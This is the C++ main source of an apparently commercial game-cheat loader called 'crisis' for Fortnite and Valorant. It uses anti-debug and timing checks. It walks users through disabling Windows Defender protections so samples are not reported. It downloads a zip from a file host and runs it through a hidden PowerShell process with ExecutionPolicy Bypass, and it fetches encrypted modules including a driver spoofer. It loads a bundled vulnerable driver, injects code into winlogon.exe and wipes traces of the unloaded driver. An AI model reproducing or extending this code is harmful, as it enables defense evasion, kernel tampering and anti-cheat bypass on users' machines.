#include <deps\includes.h>
#include <charconv>
#include <urlmon.h>

#pragma comment( lib, "winmm.lib" )
#pragma comment( lib, "Synchronization.lib" )
#pragma comment( lib, "urlmon.lib" )
extern "C" __declspec( dllimport ) UINT WINAPI timeBeginPeriod( UINT );
extern "C" __declspec( dllimport ) UINT WINAPI timeEndPeriod( UINT );

constexpr bool developer_mode = development_environment != 0;
//#if !defined(_DEBUG)
//static_assert( !developer_mode, "developer_mode must never be enabled in a Release build" );
//#endif



static void clear_sensitive( std::string& value ) {
	if ( !value.empty( ) ) SecureZeroMemory( value.data( ), value.size( ) );
	value.clear( );
}

static void clear_sensitive( std::vector< wchar_t >& value ) {
	if ( !value.empty( ) ) SecureZeroMemory( value.data( ), value.size( ) * sizeof( wchar_t ) );
	value.clear( );
}

static void clear_sensitive( std::vector< std::uint8_t >& value ) {
	if ( !value.empty( ) ) SecureZeroMemory( value.data( ), value.size( ) );
	value.clear( );
}

static bool has_environment_name( const std::wstring_view entry, const std::wstring_view name ) {
	if ( entry.empty( ) || entry.front( ) == L'=' )
		return false;
	const auto separator = entry.find( L'=' );
	return separator == name.size( ) &&
		_wcsnicmp( entry.data( ), name.data( ), name.size( ) ) == 0;
}

static std::vector< wchar_t > build_child_environment( const bool include_auth,
	const std::string& player_token, const std::string& pairing_code ) {
	auto* inherited = GetEnvironmentStringsW( );
	if ( !inherited )
		return { };

	std::vector< wchar_t > environment;
	for ( auto* entry = inherited; *entry; ) {
		const std::size_t length = std::wcslen( entry );
		const std::wstring_view view( entry, length );
		if ( !has_environment_name( view, L"CRISIS_LICENSE_KEY" ) &&
			!has_environment_name( view, L"CRISIS_HWID" ) &&
			!has_environment_name( view, L"CRISIS_ACCESS_TOKEN" ) &&
			!has_environment_name( view, L"CRISIS_PLAYER_TOKEN" ) &&
			!has_environment_name( view, L"CRISIS_PAIRING_CODE" ) &&
			!has_environment_name( view, L"CRISIS_AUTH_HOST" ) &&
			!has_environment_name( view, L"CRISIS_AUTH_PORT" ) &&
			!has_environment_name( view, L"CRISIS_AUTH_URL" ) ) {
			environment.insert( environment.end( ), entry, entry + length + 1 );
		}
		entry += length + 1;
	}
	FreeEnvironmentStringsW( inherited );

	const auto append = [ & ]( const std::wstring& name, const std::string& value ) {
		environment.insert( environment.end( ), name.begin( ), name.end( ) );
		environment.push_back( L'=' );
		environment.insert( environment.end( ), value.begin( ), value.end( ) );
		environment.push_back( L'\0' );
	};
	if ( include_auth ) {
		append( L"CRISIS_AUTH_HOST", auth::native_host( ) );
		append( L"CRISIS_AUTH_PORT", std::to_string( auth::native_port( ) ) );
		append( L"CRISIS_PLAYER_TOKEN", player_token );
		if ( !pairing_code.empty( ) )
			append( L"CRISIS_PAIRING_CODE", pairing_code );
	}

	if ( environment.empty( ) )
		environment.push_back( L'\0' );
	environment.push_back( L'\0' );
	return environment;
}

/*
	4 modules to be streamed from the auth:
		1. memory - ( read/write primitive )
		2. overlay - ( window hijacking )
		3. bypass - ( bypass usage )
		4. external - ( cheating software ) 
*/

static std::vector<std::uint8_t> load_file( const wchar_t* name ) {
	WCHAR path[ MAX_PATH ];
	GetModuleFileNameW( nullptr, path, MAX_PATH );
	wchar_t* sep = wcsrchr( path, L'\\' );
	if ( sep ) *( sep + 1 ) = L'\0';
	else path[ 0 ] = L'\0';
	wcscat_s( path, name );
	std::ifstream f( path, std::ios::binary | std::ios::ate );
	if ( !f ) return { };
	const auto sz = static_cast<std::size_t>( f.tellg( ) );
	f.seekg( 0 );
	std::vector<std::uint8_t> data( sz );
	f.read( reinterpret_cast<char*>( data.data( ) ), sz );
	return data;
}

static constexpr auto authentication_path = L"C:\\crisis\\profiles\\authentication.log";

static bool load_cached_license( std::string& key ) {
	std::ifstream file( authentication_path, std::ios::binary );
	if ( !file || !std::getline( file, key ) )
		return false;

	while ( !key.empty( ) && ( key.back( ) == '\r' || key.back( ) == '\n' ||
		key.back( ) == ' ' || key.back( ) == '\t' ) )
		key.pop_back( );
	return !key.empty( );
}

static bool store_cached_license( const std::string& key ) {
	if ( key.empty( ) )
		return false;

	CreateDirectoryW( L"C:\\crisis", nullptr );
	CreateDirectoryW( L"C:\\crisis\\profiles", nullptr );
	std::ofstream file( authentication_path, std::ios::binary | std::ios::trunc );
	if ( !file )
		return false;
	file.write( key.data( ), static_cast< std::streamsize >( key.size( ) ) );
	return file.good( );
}

void dump_dbgmon( ) {
	for ( auto msg : dbgmon::drain( ) ) {
		std::string_view line = msg;
		if ( line.size( ) > 12 && line[ 0 ] == '[' && line[ 9 ] == ']' && line[ 10 ] == ' ' )
			line = line.substr( 11 );

		std::string_view prefix {};
		if ( line.size( ) > 2 && line[ 0 ] == '[' ) {
			const auto close = line.find( ']' );
			if ( close != std::string_view::npos ) {
				prefix = line.substr( 1, close - 1 );
				if ( prefix.size( ) > 7 && prefix.substr( 0, 7 ) == "crisis-" )
					prefix.remove_prefix( 7 );
				line = line.substr( close + 1 );
				while ( !line.empty( ) && line.front( ) == ' ' )
					line.remove_prefix( 1 );
			}
		}

		auto now = std::chrono::system_clock::now( );
		std::time_t t_val = std::chrono::system_clock::to_time_t( now );
		tm lt {};
		localtime_s( &lt, &t_val );
		const auto tag = dbgmon::classify( line );

		printf(
			obf( "\x1b[38;2;220;65;251m[%02d/%02d/%04d %02d:%02d:%02d]\x1b[0m " ),
			lt.tm_mon + 1, lt.tm_mday, lt.tm_year + 1900,
			lt.tm_hour, lt.tm_min, lt.tm_sec
		);

		if ( !prefix.empty( ) )
			printf( obf( "\x1b[38;2;13;150;190m[%.*s-module]:\x1b[0m " ),
				static_cast< int >( prefix.size( ) ), prefix.data( ) );

		printf( obf( "\x1b[37m%.*s\x1b[0m\n" ),
			static_cast< int >( line.size( ) ), line.data( ) );
	}
}

static bool download_dependencies( ) {
	const DWORD models_attr = GetFileAttributesW( obf( L"C:\\crisis\\models" ) );
	if ( models_attr != INVALID_FILE_ATTRIBUTES
		&& ( models_attr & FILE_ATTRIBUTE_DIRECTORY ) ) {
		WIN32_FIND_DATAW fd {};
		HANDLE fh = FindFirstFileW( obf( L"C:\\crisis\\models\\*" ), &fd );
		bool has_content = false;
		if ( fh != INVALID_HANDLE_VALUE ) {
			do {
				if ( wcscmp( fd.cFileName, L"." ) != 0 && wcscmp( fd.cFileName, L".." ) != 0 ) {
					has_content = true;
					break;
				}
			} while ( FindNextFileW( fh, &fd ) );
			FindClose( fh );
		}
		if ( has_content )
			return true;
	}

	CreateDirectoryW( obf( L"C:\\crisis" ), nullptr );

	wchar_t temp_path[ MAX_PATH ] {};
	if ( !GetTempPathW( MAX_PATH, temp_path ) ) {
		logging::print( obf( "could not get temp path." ) );
		return false;
	}
	const std::wstring zip_path = std::wstring( temp_path ) + std::wstring( obf( L"dependencies.zip" ) );

	logging::print( obf( "downloading dependencies..." ) );
	if ( FAILED( URLDownloadToFileW( nullptr,
		obf( L"https://files.catbox.moe/4uyezv.zip" ),
		zip_path.c_str( ), 0, nullptr ) ) ) {
		logging::print( obf( "failed to download dependencies: 0x%x" ), GetLastError( ) );
		return false;
	}

	std::wstring cmd =
		L"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \""
		L"$ErrorActionPreference='Stop';"
		L"$z='" + zip_path + L"';"
		L"$s=Join-Path $env:TEMP 'crisis-deps-stage';"
		L"if(Test-Path $s){ Remove-Item -Path $s -Recurse -Force };"
		L"Expand-Archive -Path $z -DestinationPath $s -Force;"
		L"if(!(Test-Path 'C:\\crisis')){ New-Item -Path 'C:\\crisis' -ItemType Directory | Out-Null };"
		L"$inner=Join-Path $s 'zip';"
		L"$root=if(Test-Path $inner){ $inner } else { $s };"
		L"Get-ChildItem -Path $root -Force | Copy-Item -Destination 'C:\\crisis' -Recurse -Force;"
		L"Remove-Item -Path $s -Recurse -Force -ErrorAction SilentlyContinue;"
		L"Remove-Item -Path $z -Force -ErrorAction SilentlyContinue;"
		L"\"";

	STARTUPINFOW si {};
	si.cb          = sizeof( si );
	si.dwFlags     = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION pi {};

	std::vector< wchar_t > cmdline( cmd.begin( ), cmd.end( ) );
	cmdline.push_back( L'\0' );

	if ( !CreateProcessW( nullptr, cmdline.data( ), nullptr, nullptr, FALSE,
		CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi ) ) {
		logging::print( obf( "failed to spawn extractor: %lu" ), GetLastError( ) );
		return false;
	}
	WaitForSingleObject( pi.hProcess, 120000 );
	DWORD exit_code = 1;
	GetExitCodeProcess( pi.hProcess, &exit_code );
	CloseHandle( pi.hThread );
	CloseHandle( pi.hProcess );

	if ( exit_code != 0 ) {
		logging::print( obf( "extractor exited %lu" ), exit_code );
		return false;
	}

	const DWORD post_attr = GetFileAttributesW( obf( L"C:\\crisis\\models" ) );
	const bool have_models = post_attr != INVALID_FILE_ATTRIBUTES
		&& ( post_attr & FILE_ATTRIBUTE_DIRECTORY );
	if ( !have_models )
		logging::print( obf( "extraction completed but models directory missing" ) );
	else
		logging::print( obf( "extracted dependencies to disk!\n" ) );

	return have_models;
}

static const loader_games::module_t* select_game_module( const std::vector< std::string >& entitlements ) {
	const auto modules = loader_games::entitled_modules( entitlements );
	if ( modules.empty( ) )
		return nullptr;
	if ( modules.size( ) == 1 )
		return modules.front( );

	logging::print( obf( "this license includes multiple games:" ) );
	for ( std::size_t index = 0; index < modules.size( ); ++index ) {
		std::string lower_name( modules[ index ]->display_name );
		std::transform( lower_name.begin( ), lower_name.end( ), lower_name.begin( ), [ ]( unsigned char c ) { return std::tolower( c ); } );
		logging::print( obf( "  %zu. %.*s" ), index + 1, static_cast< int >( lower_name.size( ) ), lower_name.data( ) );
	}

	while ( true ) {
		std::printf( obf( "select a game [1-%zu]: " ), modules.size( ) );
		std::fflush( stdout );
		std::string input;
		if ( !std::getline( std::cin, input ) )
			return nullptr;

		const auto first = input.find_first_not_of( " \t\r\n" );
		const auto last = input.find_last_not_of( " \t\r\n" );
		if ( first == std::string::npos )
			continue;
		input = input.substr( first, last - first + 1 );

		std::size_t selection = 0;
		const auto [ end, error ] = std::from_chars( input.data( ), input.data( ) + input.size( ), selection );
		if ( error == std::errc { } && end == input.data( ) + input.size( ) &&
			selection >= 1 && selection <= modules.size( ) )
			return modules[ selection - 1 ];
		logging::print( obf( "choose a number from the game list." ) );
	}
}

int main( ) {
	obf_bogus_256( );
	obf_indirect_branch;

	volatile const void* _obf_sig_refs[ ] = {
		( void* ) _obf_sig_themida,
		( void* ) _obf_sig_enigma1,
		( void* ) _obf_sig_enigma2,
		( void* ) _obf_sig_securom,
		( void* ) _obf_sig_nsp0,
	};
	( void ) _obf_sig_refs;

	SetConsoleTitleA( obf( " " ) );
	utility::start_title_shuffle( 10 );
	SetUnhandledExceptionFilter( crash::crash_handler );
	timeBeginPeriod( 1 );

	obf_scope_begin {
	obf_watermark( obf( "Wiping boot loader..." ), obf( "Unauthorized analysis prohibited" ) );
	obf_bogus_64( );

#ifdef _obf_windows
			if ( IsDebuggerPresent( ) ) obf_segfault;
#endif

#if defined(_obf_x64)
			{
				volatile auto t0 = __rdtsc( );
				volatile int  x = 0;
				for ( volatile int i = 0; i < 1000; i++ ) x += i;
				if ( ( __rdtsc( ) - t0 ) > 2'000'000ULL ) obf_segfault;
			}
#endif
	} obf_scope_end;

	auto std_handle = GetStdHandle( STD_OUTPUT_HANDLE );
	DWORD mode;
	GetConsoleMode( std_handle, &mode );
	mode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
	SetConsoleMode( std_handle, mode );

	CONSOLE_FONT_INFOEX cfi { };
	cfi.cbSize = sizeof( cfi );
	cfi.nFont = 0;
	cfi.dwFontSize.X = 8;
	cfi.dwFontSize.Y = 15;
	cfi.FontFamily = FF_DONTCARE;
	cfi.FontWeight = FW_NORMAL;
	wcscpy_s( cfi.FaceName, obf( L"Raster Fonts" ) );
	SetCurrentConsoleFontEx( GetStdHandle( STD_OUTPUT_HANDLE ), FALSE, &cfi );
	enable_virtual_terminal( );
	print_logo( );

	if ( utility::is_already_running( ) ) {
		logging::print( obf( "warning: software is already running!" ) );
		utility::exit_process( );
	}

	{
		namespace d = utility::defender;
		bool def_tamper_protection           = d::is_tamper_protection_enabled( );
		bool def_realtime_protection         = d::is_realtime_protection_enabled( );
		bool def_automatic_sample_submission = d::is_automatic_sample_submission_enabled( );
		bool def_cloud_delivered_protection  = d::is_cloud_protection_enabled( );
		bool def_ioav_protection             = d::is_ioav_protection_enabled( );
		bool def_asr_rules                   = d::is_asr_enabled( );
		bool def_network_protection          = d::is_network_protection_enabled( );
		bool def_controlled_folder_access    = d::is_controlled_folder_access_enabled( );
		bool def_pua_protection              = d::is_pua_protection_enabled( );
		bool def_on_access_protection        = d::is_on_access_protection_enabled( );
		const bool def_dep                   = d::is_dep_enabled_here( );
		const bool def_cfg                   = d::is_cfg_enabled_here( );
		const bool def_defender_service      = d::is_defender_service_enabled( );
		const bool ci_smart_app_control      = d::is_smart_app_control_enabled( );

		if ( d::is_defender_neutralized( ) ) {
			logging::print(
				obf( "windows defender disabled!" ) );
			def_tamper_protection           = false;
			def_realtime_protection         = false;
			def_automatic_sample_submission = false;
			def_cloud_delivered_protection  = false;
			def_ioav_protection             = false;
			def_asr_rules                   = false;
			def_network_protection          = false;
			def_controlled_folder_access    = false;
			def_pua_protection              = false;
			def_on_access_protection        = false;
		}

		struct hard_gate_t { bool on; const char* label; const char* path; };
		const hard_gate_t hard[] = {
			{ def_tamper_protection,           obf( "Tamper Protection"                            ),
				obf( "Windows Security > Virus & threat protection > Manage settings > Tamper Protection = Off" ) },
			{ def_realtime_protection,         obf( "Real-time protection"                         ),
				obf( "Windows Security > Virus & threat protection > Manage settings > Real-time protection = Off" ) },
			{ def_automatic_sample_submission, obf( "Automatic sample submission"                  ),
				obf( "Windows Security > Virus & threat protection > Manage settings > Automatic sample submission = Off" ) },
			{ def_cloud_delivered_protection,  obf( "Cloud-delivered protection (MAPS)"            ),
				obf( "Windows Security > Virus & threat protection > Manage settings > Cloud-delivered protection = Off" ) },
			{ def_ioav_protection,             obf( "IOAV (downloaded / attachment scan)"          ),
				obf( "Admin PowerShell:  Set-MpPreference -DisableIOAVProtection $true" ) },
			{ ci_smart_app_control,            obf( "Smart App Control (blocks unsigned binaries)" ),
				obf( "Windows Security > App & browser control > Smart App Control settings > Off" ) },
		};

		#define oc( x ) static_cast< const char* >( x )

		std::string hard_on;
		std::size_t hard_count = 0;
		for ( const auto& g : hard )
			if ( g.on ) {
				hard_on.append( oc( obf( "  - " ) ) );
				hard_on.append( g.label );
				hard_on.append( "\n" );
				hard_on.append( oc( obf( "      " ) ) );
				hard_on.append( g.path );
				hard_on.append( "\n\n" );
				++hard_count;
			}

		if ( !hard_on.empty( ) ) {
			logging::print( obf( "windows defender is blocking the loader!" ) );

			std::string message = oc( obf(
				"Windows Defender is blocking the loader.\n\n" ) );
			message.append( hard_on );
			message.append( oc( obf(
				"\nRe-run the loader once these are off.\n\n"
				"Leaving Cloud-delivered protection or Automatic sample submission on will upload the loader "
				"and its modules to Microsoft." ) ) );
			utility::wide_message_box( nullptr,
				message.c_str( ),
				obf( "Virus & threat protection blocks the loader" ),
				MB_OK | MB_ICONERROR | MB_TOPMOST | MB_SETFOREGROUND );

			utility::exit_process( );
		}

		struct soft_gate_t { bool on; const char* label; const char* effect; const char* path; };
		const soft_gate_t soft[] = {
			{ def_asr_rules,                obf( "Attack Surface Reduction" ),
				obf( "may block dependency binaries" ),
				obf( "Admin PowerShell:  Set-MpPreference -AttackSurfaceReductionRules_Ids <GUID> -AttackSurfaceReductionRules_Actions Disabled" ) },
			{ def_network_protection,       obf( "Network protection" ),
				obf( "may block dependency downloads" ),
				obf( "Admin PowerShell:  Set-MpPreference -EnableNetworkProtection Disabled" ) },
			{ def_controlled_folder_access, obf( "Controlled folder access" ),
				obf( "may block debugging to software cache" ),
				obf( "Windows Security > Virus & threat protection > Manage ransomware protection > Controlled folder access = Off" ) },
			{ def_dep, obf( "Data Execution Prevention (DEP)" ),
				obf( "may interfere with shellcode injection" ),
				obf( "Windows Security > App & browser control > Exploit protection > Program settings" ) },
			{ def_cfg, obf( "Control Flow Guard (CFG)" ),
				obf( "may block indirect calls in injected modules" ),
				obf( "Windows Security > App & browser control > Exploit protection > Program settings" ) },
		};

		std::string soft_on;
		for ( const auto& s : soft )
			if ( s.on ) {
				soft_on.append( oc( obf( "  - " ) ) );
				soft_on.append( s.label );
				soft_on.append( oc( obf( " (" ) ) );
				soft_on.append( s.effect );
				soft_on.append( oc( obf( ")\n" ) ) );
				soft_on.append( oc( obf( "      " ) ) );
				soft_on.append( s.path );
				soft_on.append( "\n\n" );
			}

		if ( !soft_on.empty( ) ) {
			logging::print( obf( "windows defender could cause crashes!" ) );

			std::string message = oc( obf(
				"The following Windows Defender features are enabled and may cause runtime failures:\n\n" ) );
			message.append( soft_on );
			message.append( oc( obf( "\nContinue anyway?" ) ) );

			const auto answer = utility::wide_message_box( nullptr,
				message.c_str( ),
				obf( "Windows Defender settings warning" ),
				MB_YESNO | MB_ICONWARNING | MB_TOPMOST | MB_SETFOREGROUND );
			if ( answer != IDYES )
				utility::exit_process( );
			logging::print( obf( "warning: continuing with defender active.." ) );
		}

		#undef oc
	}

	bool should_extract_deps = false;
	std::vector< std::uint8_t > memory_data;
	std::vector< std::uint8_t > overlay_data;
	std::vector< std::uint8_t > bypass_data;
	std::vector< std::uint8_t > external_data;
	std::vector< std::uint8_t > spoofer_data;
	std::vector< std::uint8_t > vulnernable_data;
	vulnernable_data.assign( std::begin( driver_bytes ), std::end( driver_bytes ) );
	std::string access_token;
	std::string player_token;
	std::string pairing_code;

	#if development_environment
	memory_data  = load_file( obf( L"crisis-memory.dll" ) );
	overlay_data = load_file( obf( L"crisis-overlay.dll")  );
	bypass_data  = load_file( obf( L"crisis-bypass.dll" ) );
	external_data = load_file( obf( L"crisis-fortnite.dll" ) );
	spoofer_data = load_file( obf( L"crisis-spoofer.sys" ) );
	should_extract_deps = true;
	#else

	std::string license_key;
	const auto cached_license = load_cached_license( license_key );
	if ( !cached_license && !auth::prompt_key( license_key ) ) {
		logging::print( obf( "failed to acquire license key." ) );
		utility::exit_process( );
	}

	const auto hwid = auth::generate_hwid( );
	auto auth_response = auth::authenticate( license_key, hwid );
	if ( !auth_response.success && cached_license ) {
		SecureZeroMemory( license_key.data( ), license_key.size( ) );
		license_key.clear( );
		DeleteFileW( authentication_path );
		logging::print( obf( "previous license key is invalid!" ) );
		if ( !auth::prompt_key( license_key ) ) {
			logging::print( obf( "failed to acquire license key." ) );
			utility::exit_process( );
		}
		auth_response = auth::authenticate( license_key, hwid );
	}
	else
		logging::print( obf( "found saved license key!" ) );

	auto auth_message = auth_response.message;
	std::transform( auth_message.begin( ), auth_message.end( ), auth_message.begin( ),
		[]( const unsigned char ch ) { return static_cast< char >( std::tolower( ch ) ); } );
	if ( !auth_response.success ) {
		SecureZeroMemory( license_key.data( ), license_key.size( ) );
		license_key.clear( );
		logging::print( obf( "failed to authenticate license: %s" ), auth_message.c_str( ) );
		utility::exit_process( );
	}

	if ( !store_cached_license( license_key ) )
		logging::print( obf( "warning: failed to save license key." ) );
	const auto* selected_game = select_game_module( auth_response.games );
	if ( !selected_game ) {
		clear_sensitive( license_key );
		logging::print( obf( "license has no game supported by this loader." ) );
		utility::exit_process( );
	}
	should_extract_deps = ( selected_game->id == "fortnite" );

	logging::print( obf( "successfully authenticated!\n" ) );
	logging::print( obf( "%s" ), auth_message.c_str( ) );
	logging::print( obf( "use your pairing code to link discord! (%s)" ), auth_response.pairing_code.c_str( ) );
	std::string lower_name( selected_game->display_name );
	std::transform( lower_name.begin( ), lower_name.end( ), lower_name.begin( ), [ ]( unsigned char c ) { return std::tolower( c ); } );

	logging::print( obf( "selected %.*s external.\n" ),
		static_cast< int >( lower_name.size( ) ), lower_name.data( ) );
	logging::print( obf( "downloading software modules." ) );
	logging::print( obf( "might take a couple seconds.." ) );

	access_token = std::move( auth_response.access_token );
	player_token = std::move( auth_response.player_token );
	pairing_code = std::move( auth_response.pairing_code );
	const bool modules_ready =
		auth::download_and_decrypt_module( access_token, hwid, std::string( obf( "crisis-memory.dll" ) ), memory_data ) &&
		auth::download_and_decrypt_module( access_token, hwid, std::string( obf( "crisis-overlay.dll" ) ), overlay_data ) &&
		auth::download_and_decrypt_module( access_token, hwid, std::string( obf( "crisis-bypass.dll" ) ), bypass_data ) &&
		auth::download_and_decrypt_module( access_token, hwid, std::string( selected_game->filename ), external_data ) &&
		auth::download_driver( access_token, hwid, std::string( obf( "driver.sys" ) ), spoofer_data );

	clear_sensitive( license_key );
	if ( !modules_ready ) {
		clear_sensitive( access_token );
		clear_sensitive( player_token );
		clear_sensitive( pairing_code );
		logging::print( obf( "failed to download software modules!" ) );
		utility::exit_process( );
	}
	clear_sensitive( access_token );
	#endif

	if ( memory_data.empty( ) || overlay_data.empty( ) ||
		bypass_data.empty( ) || external_data.empty( ) ) {
		logging::print( obf( "failed to load software modules!" ) );
		utility::exit_process( );
	}

	#if development_environment
	logging::print( obf( "loaded software modules!\n" ) );
	#else
	logging::print( obf( "downloaded software modules!\n" ) );
	#endif

	if ( should_extract_deps ) {
		if ( !download_dependencies( ) )
			logging::print( obf( "dependencies missing; continuing anyway\n" ) );
	}

	utility::toggle_privilege( SE_BACKUP_PRIVILEGE, true );
	utility::toggle_privilege( SE_DEBUG_PRIVILEGE, true );

	obf_indirect_branch;
	obf_bogus_64( );
	logging::print( obf( "downloading ntoskrnl pdb.." ) );
	obf_bogus_16( );

	if ( !g_pdb->load( ) ) {
		obf_bogus_16( );
		logging::print( obf( "failed to load pdb" ) );
		logging::print( obf( "contact support with this console." ) );
		utility::exit_process( );
	}

	obf_bogus_64( );
	logging::print( obf( "loaded %s symbols\n" ),
		utility::add_commas( g_pdb->m_symbols.size( ) ).c_str( ) );
	obf_bogus_16( );
	obf_indirect_branch;

	if ( GetFileAttributesW( obf( L"C:\\Windows\\System32\\InputSwitchToastHandler.exe" ) ) == INVALID_FILE_ATTRIBUTES ) {
		logging::print( obf( "failed to get attributes: 0x%x" ), GetLastError( ) );
		utility::exit_process( );
	}

	auto input_switch_toast_handler = utility::find_pid( obf( L"InputSwitchToastHandler.exe" ) );
	if ( input_switch_toast_handler ) {
		auto process_handle = OpenProcess(
			PROCESS_ALL_ACCESS,
			false,
			input_switch_toast_handler );
		if ( !process_handle ) {
			logging::print( obf( "failed to open process: 0x%x" ), GetLastError( ) );
			utility::exit_process( );
		}

		const auto result = MessageBoxA(
			nullptr,
			obf( "An external session is already running!\nThe external is running and doesn't need to be restarted.\nWe recommend to restart if the external isn't running after launching the game.\n\nRestart it?" ),
			obf( "Do you want to restart the external session?" ),
			MB_YESNO | MB_ICONWARNING | MB_TOPMOST | MB_SETFOREGROUND
		);

		if ( result == IDYES ) {
			utility::exit_process( process_handle );
		}
		else {
			logging::print( obf( "external operation log:" ) );
			dbgmon::start( );

			while ( true ) {
				if ( WaitForSingleObject( process_handle, 0 ) == WAIT_OBJECT_0 ) {
					DWORD exit_code = 0;
					GetExitCodeProcess( process_handle, &exit_code );
					if ( !exit_code ) {
						logging::print( obf( "warning: external was terminated." ) );
						logging::print( obf( "warning: contact support with this console if this wasn't you." ) );
					}
					else {
						logging::print( obf( "external crashed: 0x%x" ), exit_code );
						logging::print( obf( "contact support with this console." ) );
					}

					if ( const HWND console_hwnd = GetConsoleWindow( ) ) {
						ShowWindow( console_hwnd, SW_RESTORE );
						SetForegroundWindow( console_hwnd );
						BringWindowToTop( console_hwnd );
					}

					CloseHandle( process_handle );
					utility::exit_process( 12 );
				}

				dump_dbgmon( );
				std::this_thread::sleep_for( std::chrono::milliseconds( 100 ) );
			}
		}
	}

	wchar_t process_name[ MAX_PATH ] {};
	if ( utility::is_anti_cheat_running( process_name ) ) {
		char narrow[ MAX_PATH ] {};
		WideCharToMultiByte( CP_UTF8, 0, process_name, -1, narrow, MAX_PATH, nullptr, nullptr );
		logging::print( obf( "warning: terminate %s and try again!" ), narrow );
		utility::exit_process( );
	}

#if development_environment
	static bool is_for_valorant = false;
	if ( utility::is_valorant_installed( ) || utility::is_vanguard_running( ) ) {
		is_for_valorant = ( MessageBoxW(
			nullptr,
			obf(
				L"This product supports multiple games.\n"
				L"Selecting the correct game ensures features are configured properly.\n\n"
				L"Is this product purchased for Valorant?" ),
			obf( L"Game selection" ),
			MB_YESNO | MB_ICONQUESTION | MB_TOPMOST | MB_SETFOREGROUND
		) == IDYES );
	}
	
	wchar_t service_name[ MAX_PATH ] {};
	if ( !is_for_valorant && utility::is_vanguard_running( service_name ) ) {
		char narrow[ MAX_PATH ] {};
		WideCharToMultiByte( CP_UTF8, 0, service_name, -1, narrow, MAX_PATH, nullptr, nullptr );
		logging::print( obf( "warning: terminate %s and try again!" ), narrow );
		utility::exit_process( );
	}
#else
	const bool is_for_valorant = lower_name.find( obf( "valorant" ) ) != std::string::npos;

	wchar_t service_name[ MAX_PATH ] {};
	if ( !is_for_valorant && utility::is_vanguard_running( service_name ) ) {
		char narrow[ MAX_PATH ] {};
		WideCharToMultiByte( CP_UTF8, 0, service_name, -1, narrow, MAX_PATH, nullptr, nullptr );
		logging::print( obf( "warning: terminate %s and try again!" ), narrow );
		utility::exit_process( );
	}
#endif

	if ( is_for_valorant ) {
		if ( !utility::is_vvci_or_vbs_enabled( ) ) {
			MessageBoxW(
				nullptr,
				obf(
					L"Valorant requires Hypervisor-Protected Code Integrity (HVCI) to be enabled.\n"
					L"HVCI is currently disabled on this machine.\n\n"
					L"Please enable HVCI in Windows Security > Device Security > Core Isolation\n"
					L"and restart your machine before launching." ),
				obf( L"HVCI required" ),
				MB_OK | MB_ICONERROR | MB_TOPMOST | MB_SETFOREGROUND
			);

			utility::exit_process( );
		}
	}

	dbgmon::start( );

	obf_bogus_64( );
	logging::print( obf( "preparing memory module.." ) );
	obf_bogus_16( );
	obf_indirect_branch;

	if ( !g_memory->open( ) ) {
		auto winlogon = utility::find_pid( obf( L"winlogon.exe" ) );
		if ( !winlogon ) {
			logging::print( obf( "failed to find winlogon.exe" ) );
			utility::exit_process( );
		}

		obf_bogus_16( );
		obf_indirect_branch;

		if ( !g_service->create( vulnernable_data ) ) {
			obf_bogus_16( );
			logging::print( obf( "failed to setup service" ) );
			g_service->unload( );
			utility::exit_process( );
		}

		obf_bogus_16( );

		if ( !g_driver->initialize( ) ) {
			obf_bogus_16( );
			logging::print( obf( "failed to setup driver" ) );
			g_service->unload( );
			utility::exit_process( );
		}

		obf_bogus_16( );
		obf_indirect_branch;

		if ( !g_paging->setup( ) ) {
			obf_bogus_16( );
			logging::print( obf( "failed to setup paging" ) );
			g_service->unload( );
			g_driver->unload( );
			utility::exit_process( );
		}

		obf_bogus_16( );

		if ( !g_syscall->setup( g_pdb->get_symbol_address( obf( "KeServiceDescriptorTable" ) ), g_pdb->m_module_base ) ) {
			obf_bogus_16( );
			logging::print( obf( "failed to setup syscall" ) );
			g_service->unload( );
			g_driver->unload( );
			utility::exit_process( );
		}

		obf_bogus_16( );
		obf_indirect_branch;

		if ( !g_service->cleanup( ) ) {
			obf_bogus_16( );
			logging::print( obf( "failed to clean service" ) );
			g_service->unload( );
			g_driver->unload( );
			utility::exit_process( );
		}

		obf_bogus_16( );
		auto memory = std::make_unique<module::c_module>(
			std::move( memory_data ),
			winlogon
		);

		obf_bogus_16( );
		obf_indirect_branch;

		if ( !memory->inject( ) ) {
			logging::print( obf( "failed to inject memory module" ) );
			memory->unload( );
			utility::exit_process( );
		}

		memory->cleanup( );
		obf_bogus_16( );

		if ( !g_memory->open( ) ) {
			logging::print( obf( "failed to open memory." ) );
			logging::print( obf( "contact support with this console.\n" ) );
			dump_dbgmon( );
			g_service->unload( );
			g_driver->unload( );
			utility::exit_process( );
		}

		if ( !g_mapping->setup( winlogon ) ) {
			logging::print( obf( "failed to create mappings." ) );
			logging::print( obf( "contact support with this console.\n" ) );
			dump_dbgmon( );
			g_service->unload( );
			g_driver->unload( );
			utility::exit_process( );
		}

		obf_bogus_16( );
		obf_indirect_branch;

		if ( !g_mapping->create( ) ) {
			logging::print( obf( "failed to create mappings." ) );
			logging::print( obf( "contact support with this console.\n" ) );
			dump_dbgmon( );
			g_service->unload( );
			g_driver->unload( );
			utility::exit_process( );
		}

		obf_bogus_16( );
		obf_indirect_branch;

		g_service->unload( );
		g_driver->unload( );
		obf_bogus_16( );

		if ( !g_memory->ping( ) ) {
			logging::print( obf( "contact support with this console.\n" ) );
			dump_dbgmon( );
			utility::exit_process( );
		}

		obf_bogus_16( );

		memory::m_read_physical = [ ]( std::uint64_t addr, void* buffer, std::size_t size ) -> bool {
			return g_memory->read( addr, buffer, size );
			};
		memory::m_write_physical = [ ]( std::uint64_t addr, void* buffer, std::size_t size ) -> bool {
			return g_memory->write( addr, buffer, size );
			};

		obf_bogus_16( );
		logging::print( obf( "connected to memory module." ) );
		g_memory->benchmark( );

		obf_bogus_16( );
		if ( !g_service->clean_unloaded_driver( ) ) {
			obf_bogus_16( );
			logging::print( obf( "failed to clean unloaded driver." ) );
			logging::print( obf( "contact support with this console.\n" ) );
			dump_dbgmon( );
			utility::exit_process( );
		}

		obf_bogus_16( );
		if ( !g_service->clean_driver_image( ) ) {
			obf_bogus_16( );
			logging::print( obf( "failed to clean driver image." ) );
			logging::print( obf( "contact support with this console.\n" ) );
			dump_dbgmon( );
			utility::exit_process( );
		}

		obf_bogus_16( );
		obf_indirect_branch;
	}
	else { 
		obf_bogus_16( );
		obf_indirect_branch;

		if ( !g_memory->ping( ) ) {
			logging::print( obf( "contact support with this console.\n" ) );
